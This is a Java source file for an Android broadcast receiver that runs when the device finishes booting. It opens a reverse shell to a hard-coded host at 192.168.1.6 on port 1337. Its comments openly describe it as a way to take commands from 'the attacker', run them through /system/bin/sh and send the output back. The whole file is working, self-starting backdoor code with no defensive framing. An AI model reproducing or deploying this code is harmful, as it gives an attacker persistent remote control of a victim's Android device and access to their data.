package com.example.bootevent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;


public class BootReceiver extends BroadcastReceiver {
    PrintWriter out;
    BufferedReader in;
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if(action != null) {
            if (action.equals(Intent.ACTION_BOOT_COMPLETED) ) {
                // TO-DO: Code to handle BOOT COMPLETED EVENT
                // TO-DO: I can start an service.. display a notification... start an activity
                getReverseShell(); //This works without netcat

            }
        }
    }
    private void getReverseShell() {
        //Running as a separate thread to reduce the load on main thread
        Thread thread = new Thread() {
            @Override
            public void run() {
                //declaring host and port
                String SERVERIP = "192.168.1.6";
                int PORT = 1337;
                try {
                    InetAddress HOST = InetAddress.getByName(SERVERIP);
                    Socket socket = new Socket(HOST, PORT);
                    Log.d("TCP CONNECTION", String.format("Connecting to %s:%d (TCP)", HOST, PORT));
                    //Don't connect using the following line - not required
                    // socket.connect( new InetSocketAddress( HOST, PORT ), 3000 );
                    while (true) {
                        //Following line is to send command output to the attacker
                        out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);

                        //Following line is to receive commands from the attacker
                        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                        //Reading string input using InputStreamReader object - These are the commands attacker sends via our remote shell
                        String command = in.readLine();
                        //input command will be executed using exec method
                        Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});

                        //The following lines will take the above output as input and place them in a string buffer.
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        int read;
                        char[] buffer = new char[4096];
                        StringBuffer output = new StringBuffer();
                        while ((read = reader.read(buffer)) > 0) {
                            output.append(buffer,0, read);
                        }
                        reader.close();

                        //Converting the output into string
                        String commandoutput = output.toString();

                        // Waits for the command to finish.
                        process.waitFor();

                        // if the string output is not null, send it to the attacker using sendOutput method:)

                        if (commandoutput != null) {
                            //call the method sendOutput
                            sendOutput(commandoutput);
                        }
                        out = null;
                    }
                } catch (Exception e) { e.printStackTrace(); }
            }
        };
        thread.start();
    }


    //method to send the final string value of the command output to attacker
    private void sendOutput(String commandoutput) {
        if (out != null && !out.checkError()) {
            out.println(commandoutput);
            out.flush();
        }
    }

}